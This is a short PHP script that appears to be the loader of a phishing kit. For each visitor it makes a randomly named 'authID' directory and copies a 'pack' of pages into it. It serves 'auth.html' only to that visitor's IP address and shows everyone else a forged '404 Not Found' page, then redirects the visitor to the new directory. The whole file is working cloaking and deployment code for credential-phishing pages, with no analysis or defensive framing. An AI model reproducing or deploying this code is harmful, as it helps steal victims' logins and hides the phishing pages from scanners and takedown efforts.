<?php


$_ = function($lenght){
  return str_shuffle(
                substr(
                         str_shuffle(
                                    str_repeat(
                                            implode("",array_merge(range('a','z'),range('A','Z'),range(0,10)))
                                              ,10)
                       ),0,$lenght)

         );
};
$lenght = 5;

$a = 'e/authID='.$_($lenght);

$ip=$_SERVER['REMOTE_ADDR'];

mkdir($a, 755);

$text = "<?php function smartCopy(\$source, \$dest, \$options=array('folderPermission'=>0755,'filePermission'=>0755)){\$result=false;if (is_file(\$source)) {if (\$dest[strlen(\$dest)-1]=='/') {if (!file_exists(\$dest)) {cmfcDirectory::makeAll(\$dest,\$options['folderPermission'],true);}\$__dest=\$dest.'/'.basename(\$source);} else {\$__dest=\$dest;}\$result=copy(\$source, \$__dest);@chmod(\$__dest,\$options['filePermission']);} elseif(is_dir(\$source)) {if (\$dest[strlen(\$dest)-1]=='/') {if (\$source[strlen(\$source)-1]=='/') {} else {\$dest=\$dest.basename(\$source);if(!file_exists(\$dest)) mkdir(\$dest);@chmod(\$dest,\$options['filePermission']);}} else {if (\$source[strlen(\$source)-1]=='/') {if(!file_exists(\$dest)) mkdir(\$dest,\$options['folderPermission']);@chmod(\$dest,\$options['filePermission']);} else {if(!file_exists(\$dest)) mkdir(\$dest,\$options['folderPermission']);@chmod(\$dest,\$options['filePermission']);}}\$dirHandle=opendir(\$source);while(\$file=readdir(\$dirHandle)){if(\$file!='.' && \$file!='..'){if(!is_dir(\$source.'/'.\$file)) {\$__dest=\$dest.'/'.\$file;} else {\$__dest=\$dest.'/'.\$file;}\$result=smartCopy(\$source.'/'.\$file, \$__dest, \$options); } } closedir(\$dirHandle); } else { \$result=false; } return \$result; } \$userip='".$ip."'; \$visitorip=\$_SERVER['REMOTE_ADDR']; if (\$userip == \$visitorip) {   smartCopy('../../pack/', dirname( __FILE__ ));  \$content = file_get_contents('auth.html'); echo \$content; } else { echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL /index.php was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>'; } ?>";

$fp = fopen($a."/index.php", "w");

fwrite($fp, $text);
fclose($fp);


$ref=$_SERVER['QUERY_STRING'];
if ($ref!='')
 {
  $ref=$a.'?'.$ref;
  header("Location:  $ref ");
 }
else
 {
  header("Location:  $a ");

 }

exit();
?>